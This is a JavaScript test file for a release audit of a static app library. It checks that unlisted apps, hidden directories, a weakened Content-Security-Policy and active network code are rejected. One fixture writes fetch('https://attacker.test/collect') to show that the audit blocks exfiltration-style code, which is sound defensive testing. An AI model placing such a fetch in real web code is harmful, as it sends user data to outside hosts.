import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,cp,mkdir,rm,readFile,writeFile,copyFile} from 'node:fs/promises';
import {join} from 'node:path';
import {tmpdir} from 'node:os';
import {fileURLToPath} from 'node:url';
import {auditReviewedLibrary} from '../scripts/check-library-catalog.mjs';

const ROOT=fileURLToPath(new URL('../site/library/apps/',import.meta.url));
const CATALOG=fileURLToPath(new URL('../site/library/catalog.json',import.meta.url));
test('all published reviewed static app entries have matching validated first-party source',async()=>{
 const report=await auditReviewedLibrary();
 assert.equal(report.reviewedBy,'source-review-required');
 assert.equal(report.count,3);
 assert.deepEqual(report.apps.map(x=>x.id),
  ['json-inspector','contrast-checker','text-diff']);
 for(const app of report.apps){
  assert.ok(app.files>=1);
  assert.ok(app.expandedBytes>100);
  assert.match(app.indexSha256,/^[0-9a-f]{64}$/);
  assert.equal(app.entry,'/library/apps/'+app.id+'/');
 }
});

test('unlisted or hidden app sources, tampered CSP and active network code stop the release',async()=>{
 const work=await mkdtemp(join(tmpdir(),'24gotop-library-release-'));
 const apps=join(work,'apps'),catalog=join(work,'catalog.json');
 try{
  await cp(ROOT,apps,{recursive:true});
  await copyFile(CATALOG,catalog);
  const audit=()=>auditReviewedLibrary({appRoot:apps,catalogPath:catalog});
  assert.equal((await audit()).count,3);
  const foreign=join(apps,'unlisted-app');
  await mkdir(foreign);
  await writeFile(join(foreign,'index.html'),'<html><title>Unknown</title></html>');
  await assert.rejects(audit(),/unlisted/);
  await rm(foreign,{recursive:true});
  const hidden=join(apps,'.hidden');
  await mkdir(hidden);
  await assert.rejects(audit(),/unsafe app directory/);
  await rm(hidden,{recursive:true});
  const original=await readFile(join(apps,'text-diff','index.html'),'utf8');
  await writeFile(join(apps,'text-diff','index.html'),original.replace(
   "connect-src 'none'","connect-src https:"));
  await assert.rejects(audit(),/unsafe CSP/);
  await writeFile(join(apps,'text-diff','index.html'),original);
  await writeFile(join(apps,'text-diff','remote.js'),
   'fetch("https://attacker.test/collect")');
  await assert.rejects(audit(),/disallowed active capability/);
  await rm(join(apps,'text-diff','remote.js'));
  assert.equal((await audit()).count,3);
  const json=JSON.parse(await readFile(catalog,'utf8'));
  json.apps.pop();
  await writeFile(catalog,JSON.stringify(json));
  await assert.rejects(audit(),/unlisted/);
 }finally{
  await rm(work,{recursive:true,force:true,maxRetries:5,retryDelay:50});
 }
});

test('no extra first-party app enters a public route without the same catalog review gate',async()=>{
 const script=await readFile(new URL('../scripts/check-library-catalog.mjs',import.meta.url),'utf8');
 const packageJson=JSON.parse(await readFile(new URL('../package.json',import.meta.url),'utf8'));
 const release=await readFile(new URL('../scripts/verify-public-static.mjs',import.meta.url),'utf8');
 assert.match(packageJson.scripts.check,/npm run library:check/);
 assert.equal(packageJson.scripts['library:check'],'node scripts/check-library-catalog.mjs --check');
 assert.match(script,/validateStaticDirectory/);
 assert.match(script,/!approved\.has\(entry\.name\)/);
 assert.match(script,/reviewedBy:'source-review-required'/);
 for(const name of ['json-inspector','contrast-checker','text-diff']){
  assert.ok(release.includes("'/library/apps/"+name+"/'"));
 }
});
